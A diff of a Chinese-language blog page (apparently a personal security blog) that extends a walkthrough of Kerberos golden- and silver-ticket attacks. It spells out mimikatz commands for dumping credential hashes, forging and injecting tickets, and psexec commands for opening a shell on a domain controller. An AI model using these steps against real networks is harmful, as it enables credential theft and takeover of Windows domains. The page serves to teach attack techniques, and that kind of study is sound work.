@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      179 字
+      239 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      2
+      3
        分钟
     </span>
   
@@ -237,11 +237,20 @@
 <ol start="2">
 <li>   切换到普通域用户的机器，生成TGT凭证,用户名为administrator<br>mimi下执行kerberos::golden /user:administrator /domain:xxx.com /sid:xx-xx-xx-xx /krbtgt:Hash值 /ticket</li>
 </ol>
+<p>这里要注意sid不能带最后一个横杠之后的内容</p>
 <p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_03.png" srcset="/img/loading.gif" lazyload></p>
 <ol start="3">
-<li>   然后使用mimikatz将凭证注入进去,攻击成功:<br>mimikatz # kerberos::ptt Administrator.kirbi</li>
-</ol>
+<li><p>   然后使用mimikatz将凭证注入进去,攻击成功:</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># kerberos::purge</span><br>mimikatz <span class="hljs-comment"># kerberos::ptt Administrator.kirbi</span><br></code></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_04.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p> 使用psexec连接域控或其他域计算机</p>
+</li>
+</ol>
+<p>\后面跟计算机名</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psexec<span class="hljs-selector-class">.exe</span> \\DC<span class="hljs-selector-class">.next</span><span class="hljs-selector-class">.com</span> cmd<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_07.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h2><ol>
 <li>   首先登录域控，dump机器hash<br>privilege::debug<br>sekurlsa::logonpasswords</li>
 </ol>
@@ -249,6 +258,9 @@
 <p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ptt/ptt_06.png" srcset="/img/loading.gif" lazyload></p>
 <ol start="2">
 <li>   将hash保存下来，在普通域用户机器中进行ptt<br>mimi下执行kerberos::golden /domain:next.com /sid:xx-xx-xx-xx  /target:172.18.16.171 /rc4:NTML Hash  /service:cifs /user:user1 /ptt,这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统</li>
+</ol>
+<ol start="3">
+<li> 也可以使用psexec<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psexec<span class="hljs-selector-class">.exe</span> \\DC<span class="hljs-selector-class">.next</span><span class="hljs-selector-class">.com</span> cmd<br></code></pre></td></tr></table></figure></li>
 </ol>
 
             </div>
